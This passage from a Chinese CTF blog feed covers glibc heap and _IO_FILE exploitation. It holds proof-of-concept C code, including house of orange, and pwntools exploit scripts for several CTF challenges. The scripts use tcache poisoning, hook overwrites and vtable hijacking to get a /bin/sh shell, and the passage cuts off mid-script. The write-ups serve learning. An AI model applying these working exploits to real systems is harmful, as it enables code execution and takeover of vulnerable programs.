<p>top[0]&#x3D;”\bin\sh”；writebase&lt;writeptr&#x3D;writeend；vtable指向top中的一块已经构造好的地方。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc-7 -c houseoforange.c -o orange.o</span></span><br><span class="line"><span class="comment">ld --dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so    --rpath=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64    orange.o -o orange -lc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">long</span> * fun = (<span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*释放topchunk进入unsortedbin */</span></span><br><span class="line">    <span class="type">long</span> * ptr1 = (<span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">long</span> * top = (ptr1+<span class="number">2</span>);</span><br><span class="line">    <span class="type">long</span> * top_size = ptr1+<span class="number">3</span>;</span><br><span class="line">    *top_size = *top_size &amp; <span class="number">0x0000000000000fff</span>;</span><br><span class="line">    <span class="type">long</span> * bck = top+<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*伪造top */</span></span><br><span class="line">    top[<span class="number">0</span>] = <span class="number">0x0068735c6e69625c</span>;</span><br><span class="line">    *bck = top[<span class="number">2</span>]+<span class="number">0x9a8</span><span class="number">-0x10</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>* <span class="title">top1</span> =</span>(<span class="keyword">struct</span> _IO_FILE*)top;</span><br><span class="line">    top1-&gt;_IO_write_base = (<span class="type">void</span> *)<span class="number">2</span>;</span><br><span class="line">    top1-&gt;_IO_write_ptr = top1-&gt;_IO_write_end =(<span class="type">void</span> *)<span class="number">3</span>;</span><br><span class="line">    *top_size = <span class="number">0x61</span>;</span><br><span class="line">    top1-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> * fake = (<span class="type">void</span>*)top;</span><br><span class="line">    <span class="type">long</span>* vtable = (<span class="type">long</span> *)(fake + <span class="number">216</span>);</span><br><span class="line">    <span class="comment">/*伪造虚表和结构体*/</span></span><br><span class="line">    *vtable = top+<span class="number">10</span>;</span><br><span class="line">    ((<span class="type">long</span> *)(*vtable))[<span class="number">3</span>]= &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*结果会打印*/</span></span><br><span class="line">root@L:/home/l/demoforheap# ./orange </span><br><span class="line">*** Error in `./orange<span class="number">&#x27;</span>: <span class="built_in">malloc</span>(): memory corruption: <span class="number">0x00007f7fdf8e0520</span> ***</span><br><span class="line">\bin\sh</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for IOFILE</title>
    <url>/2024/08/19/userpwn/fread_poc/</url>
    <content><![CDATA[<blockquote>
<p>深入学习一下IO的比较简单的部分的源代码，并简单写一下poc</p>
<p>参考链接：<a href="https://xz.aliyun.com/t/6567?time__1311=n4+xnD0Dg7G=BhDBqooGkDRm8DCY1DuAAnOoD">https://xz.aliyun.com/t/6567?time__1311=n4%2BxnD0Dg7G%3DBhDBqooGkDRm8DCY1DuAAnOoD</a></p>
</blockquote>
<h1 id="DEMO1-Fread"><a href="#DEMO1-Fread" class="headerlink" title="DEMO1-Fread"></a>DEMO1-Fread</h1><blockquote>
<p>演示了如何利用fread进行任意地址写，主要就是将缓冲区构造成目标地址，需要注意的是缓冲区当占满的时候可能会被新数据覆盖，因此小心使用。简单总结一下原理：</p>
<p>1.将缓冲区读写和目标位置的读写分开，分成大概两个模块，一个是将缓冲区的数据读到目标位置，一个是利用系统调用将文件中的数据督导缓冲区，这两个模块都会维护读指针和缓冲区的关系。</p>
<p>2.总体方向就如1所说，其中的比较重要的细节可以分为（本人理解）：</p>
<p>​	2.1 缓冲区的分配，需要设置flag来绕过，否则就会覆盖之前构造好的指针</p>
<p>​	2.2 关于其他的flag，我的建议是越少越好，flag多的话，设计的函数也会变多，虽然说逻辑可以明白，但是非常混乱，包括但不限于，save buf的交替处理，读写缓冲区共用，等等，但是中心思想还是第一点所说的，这是非常重要的。</p>
<p>​	2.3 当write，read交替操作时，会先刷新write，然后尽可能移动readend和readptr，但这只是read缓冲区大小的扩充，不代表其获得了额外数据，还是得通过系统调用来调整。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*此程序演示了向test中写内容会先把内容写到msg中*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> msg[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> test[<span class="number">20</span>];</span><br><span class="line">    test[<span class="number">20</span>]=<span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    msg[<span class="number">20</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    FILE* fd = fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw+&quot;</span>);</span><br><span class="line">    <span class="comment">/*construct FILE*/</span></span><br><span class="line">    fd-&gt;_fileno = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_flags = <span class="number">0xFBAD0000</span>;</span><br><span class="line">    fd-&gt;_IO_read_base = msg;</span><br><span class="line">    fd-&gt;_IO_read_ptr = fd-&gt;_IO_read_end = msg + <span class="number">20</span>;</span><br><span class="line">    fd-&gt;_IO_buf_base = msg;</span><br><span class="line">    fd-&gt;_IO_buf_end = msg + <span class="number">20</span>;</span><br><span class="line">    fread(test,<span class="number">1</span>,<span class="number">19</span>,fd);</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="DEMO2-Fwrite"><a href="#DEMO2-Fwrite" class="headerlink" title="DEMO2-Fwrite"></a>DEMO2-Fwrite</h1><blockquote>
<p>控制FILE结构体达成任意地址内容泄露的目的</p>
<p>符号位绕过两个检查：</p>
<p>1.overflow的分配buf的检查，如果最近没有putting过或bufbase&#x3D;0则会分配buf。</p>
<p>2.绕过do_new_write的检查，如果非追加模式的话则会判断readend和writebase的大小，会将writebase移动到未知区域。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKEMESSAGE <span class="string">&quot;helloword\x00&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>*fakemsg = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(FAKEMESSAGE)+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(fakemsg,FAKEMESSAGE,<span class="built_in">strlen</span>(FAKEMESSAGE));</span><br><span class="line">    <span class="type">char</span>*victim = <span class="string">&quot;ooo&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">     FILE* fd = fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw+&quot;</span>);</span><br><span class="line">    <span class="comment">/*construct FILE*/</span></span><br><span class="line">    fd-&gt;_fileno = <span class="number">1</span>;</span><br><span class="line">    fd-&gt;_flags = <span class="number">0xFBAD1800</span>;</span><br><span class="line">    fd-&gt;_IO_read_base = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_IO_buf_base = fakemsg;</span><br><span class="line">    fd-&gt;_IO_buf_end = fakemsg + <span class="number">100</span>;</span><br><span class="line">    fd-&gt;_IO_write_base = fakemsg;</span><br><span class="line">    fd-&gt;_IO_write_end = fd-&gt;_IO_write_ptr = fakemsg+<span class="built_in">strlen</span>(FAKEMESSAGE);</span><br><span class="line">    fwrite(victim,<span class="number">1</span>,<span class="number">3</span>,fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行结果如下：可以看见输出了目标地址的内容（以ASCII的形式）</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/poc# ./writepoc </span><br><span class="line">hellowordoooroot@L:/home/l/poc# </span><br></pre></td></tr></table></figure>





























]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>一些低版本的tcache练习</title>
    <url>/2024/08/11/userpwn/%E4%B8%80%E4%BA%9B%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84tcache%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="SECCON-2019-Online-CTF-one-pwn-heap-glibc-2-27"><a href="#SECCON-2019-Online-CTF-one-pwn-heap-glibc-2-27" class="headerlink" title="SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)"></a>SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)</h2><blockquote>
<p>主要利用了tcache的uaf和double-free漏洞，还有Tcache Poisoning和Tcache dup漏洞，可谓是一个大杂侩，虽然说题目逻辑简单，但是利用过程不是很容易，一次只能分配一个恶意块，所以需要有全局思维，要考虑如何利用漏洞并且需要在漏洞利用完还可以继续利用，因此比较复杂。对数字及其敏感，非常混乱，建议边调试边尝试。</p>
<p>哎还得是tcache，fastbin搞两下就崩了哈哈哈，可惜高版本tcache利用也成过去式了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./one&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Input memo &gt; &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##heap地址泄露</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">2</span>*p64(<span class="number">0x131</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>))</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line"></span><br><span class="line">chunkadd = u64(show().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">## 此处是为了让tcache有更多的块</span></span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line"><span class="comment">##libc地址泄露</span></span><br><span class="line">create(p64(chunkadd-<span class="number">0x150</span>+<span class="number">0x20</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(p64(chunkadd-<span class="number">0x150</span>+<span class="number">0x20</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(<span class="string">b&#x27;\xff\xff\xff\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    de()</span><br><span class="line">base = u64(show().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">sys = base +elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">##复写hook</span></span><br><span class="line">create(<span class="number">10</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">fhook = base + elf.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">create(p64(fhook)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(p64(sys))</span><br><span class="line">create(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">de()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;chunkadd:&quot;</span>,<span class="built_in">hex</span>(chunkadd))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__free_hook&quot;</span>,<span class="built_in">hex</span>(fhook))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-V-N2020-公开赛-easyTHeap"><a href="#BUUCTF-V-N2020-公开赛-easyTHeap" class="headerlink" title="BUUCTF-[V&amp;N2020 公开赛]easyTHeap"></a>BUUCTF-[V&amp;N2020 公开赛]easyTHeap</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a><strong>版本</strong></h3><p>2.27-3ubuntu1_amd64</p>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h3><p>本题是一个简陋的类似于tcache管理的程序，无法知道程序的基址，也就是说pie无法绕过，data数据段中存在两个变量控制new和delete的chunk的数量，因此本题需要细致控制new和delete的次数。new最多7次，delete最多三次。</p>
<h3 id="存在漏洞"><a href="#存在漏洞" class="headerlink" title="存在漏洞"></a><strong>存在漏洞</strong></h3><p>存在uaf和double_free漏洞，也存在打印堆内容的函数因此可以泄露地址，本题学习的地方是，可以通过Tcache Poisoning来控制tcache管理器。也就是tcache_perthread_struct结构体，来达到任意地址分配的目的</p>
<h3 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a><strong>本题思路</strong></h3><p>1.通过doublefree和uaf泄露堆地址，需要new一次，delete2次。</p>
<p>2.通过uaf来实现Tcache Poisoning攻击，得到tcache_perthread_struct结构体的读写权限。需要new三次。需要仔细构造fd，来实现Tcache Poisoning攻击。</p>
<p>3.得到堆管理器控制权限时写入极大内容，造成bin已满的情形，free掉堆管理器，会被释放到unsortedbin中，可以泄露libc的基址。需要delete一次</p>
<p>4.注意看上三次步骤已经用光了delete的次数，new的次数也用了4次。这就是控制tcache_perthread_struct结构体的绝妙之处，可以通过伪造count和fd字段，来造成还有剩余chunk的假象，因此可以实现任意地址分配，不需要用uaf来进行任意地址的读写操作。</p>
<p>5.new一次得到tcache_perthread_struct结构体的控制权限，因为unsortedbin中只有一个reminderchunk，因此会直接切分分配，new的大小要合适。</p>
<p>6.new一次，分配到<code>__realloc_hook</code>的区域，来伪造<code>__realloc_hook与__malloc_hook</code>，这两个hook在一起，因此只需要消耗一次new的机会则可以得到连个hook的读写权限。</p>
<ul>
<li><p>为什么不能直接得到mallochook来进行one-gadget的注入？</p>
<p>realloc函数中有大量的pop，push操作，可以使one-gadget条件得到满足，因此向mallochook中注入realloc的地址，向reallochook中注入one-gadget的地址，以此来构造调用链条。</p>
</li>
</ul>
<p>7.new一次，执行one-gadget，至此本题结束，恰好7次new，3次delete，及其极限。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a><strong>脚本</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./vn_pwn_easyTHeap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">def create(size):</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>choice: <span class="string">&#x27;,b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>size?<span class="string">&#x27;,size)</span></span><br><span class="line"><span class="string">def edit(index,con):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>content:<span class="string">&#x27;, con)</span></span><br><span class="line"><span class="string">def show(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;, index)</span></span><br><span class="line"><span class="string">    return io.recvuntil(&quot;\n&quot;).strip()</span></span><br><span class="line"><span class="string">def de(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;, index)</span></span><br><span class="line"><span class="string">def ex():</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">5&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 0</span></span><br><span class="line">de(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">heapadd = u64(show(b<span class="number">&#x27;0&#x27;</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">print(hex(heapadd))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 1</span></span><br><span class="line">edit(b<span class="number">&#x27;1&#x27;</span>,p64(heapadd<span class="number">-0x250</span>))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 2</span></span><br><span class="line">edit(b<span class="number">&#x27;2&#x27;</span>,p64(heapadd<span class="number">-0x250</span>))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 3,tcache_perthread_struct</span></span><br><span class="line">edit(b<span class="number">&#x27;3&#x27;</span>,<span class="number">0x40</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;3&#x27;</span>)#<span class="meta">#goto unsortedbin</span></span><br><span class="line">#<span class="meta">#getlibcbase</span></span><br><span class="line">libbase = u64(show(b<span class="number">&#x27;3&#x27;</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">print(libbase)</span><br><span class="line">mallochook = libbase+elf.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">reallochook = libbase+elf.symbols[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">print(hex(mallochook))</span><br><span class="line">## 构造tcache_perthread_struct</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 4</span></span><br><span class="line">edit(b<span class="number">&#x27;4&#x27;</span>,<span class="number">0x40</span>*b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>+p64(mallochook)+p64(reallochook))</span><br><span class="line">## 复写mallochook</span><br><span class="line">sys = libbase + <span class="number">0x4f2be</span></span><br><span class="line">relloc = libbase+elf.symbols[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line">create(b<span class="number">&#x27;40&#x27;</span>)<span class="meta">#index = 5</span></span><br><span class="line">edit(b<span class="number">&#x27;5&#x27;</span>,p64(sys)+p64(relloc+<span class="number">2</span>))</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">#<span class="meta"># index = 6</span></span><br><span class="line">io.sendafter(b<span class="number">&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="number">&#x27;</span>size?<span class="string">&#x27;, b&#x27;</span><span class="number">50&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>关于_IO_FILE的一些攻击手法</title>
    <url>/2024/08/13/userpwn/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<h1 id="HCTF-2018the-end"><a href="#HCTF-2018the-end" class="headerlink" title="HCTF 2018the_end"></a>HCTF 2018the_end</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.虚表劫持</p>
<p>2.虚表函数指针修改（改为one_gadget）</p>
<p>需要选对glibc，否则onegaget打不通…..下面py的libc是错的，但是调试的时候可以观察到会执行onegadget</p>
<p>3.<code>exec /bin/sh 1&gt;&amp;0</code>标准输出重定向</p>
<h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">io.recvuntil(b<span class="number">&#x27;0</span>x<span class="number">&#x27;</span>)</span><br><span class="line">add = <span class="type">int</span>(io.recvuntil(b<span class="string">&quot;,&quot;</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recv()</span><br><span class="line">oldvatable =add+<span class="number">3108576</span></span><br><span class="line">vtableadd0 =<span class="number">3116784</span>+<span class="number">8</span>+add</span><br><span class="line">vtable =  oldvatable + <span class="number">2272</span></span><br><span class="line">gadget1=add<span class="number">-550310</span></span><br><span class="line">gadget2=add+<span class="number">147956</span></span><br><span class="line">gadget3=add+<span class="number">151703</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    io.send(p64(vtableadd0+i))</span><br><span class="line">    io.send(p64(vtable)[i:i+<span class="number">1</span>])</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    io.send(p64(vtable+<span class="number">0x58</span>+i))</span><br><span class="line">    io.send(p64(gadget2)[i:i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<h2 id="关于本题利用方法的一些复盘"><a href="#关于本题利用方法的一些复盘" class="headerlink" title="关于本题利用方法的一些复盘"></a>关于本题利用方法的一些复盘</h2><p>目前io利用方面处于小白的阶段，主要是因为io的实现过于复杂，一堆宏定义反复横跳，并且一些用户函数在处理完很多东西都会跳到io，但是那些用户函数的实现却不仅仅涉及io，因此想要完全分析明白几乎不可能。本题就是在考察exit的执行流，经过无数层函数调用，也会处理到IO。可以在下图的函数调用栈看出：</p>
<p><img src="/img/mypic/io/vtablecheck.png" alt="vtablecheck.png"></p>
<p>此函数会遍历<code>_IO_list_all</code>链表之后调用虚表中的<code>_setbuf</code>函数 ，因此只要覆盖虚表中的函数指针，即可执行想要的函数。但是关于file虚表劫持这件事在libc2.23以后已经成为了过去式，其会判断虚表指针是否在指定范围之内。可看如下代码，并且虚表所处的位置是可读数据段也就是说不可修改，因此此方法基本行不通了，但是有很大的学习意义。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h1><h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>1.利用FSOP，通过更改_IO_list_all结构体，来改变进行文件流操作时的函数调用。</p>
<p>2.伪造_IO_FILE_plus使其一些成员满足一些特定条件来调用假的虚表中的函数。</p>
<h2 id="py-1"><a href="#py-1" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29483</span>)</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>,b<span class="number">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span> = <span class="type">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, <span class="built_in">puts</span>)</span><br><span class="line">base = <span class="built_in">puts</span> - obj.dump(<span 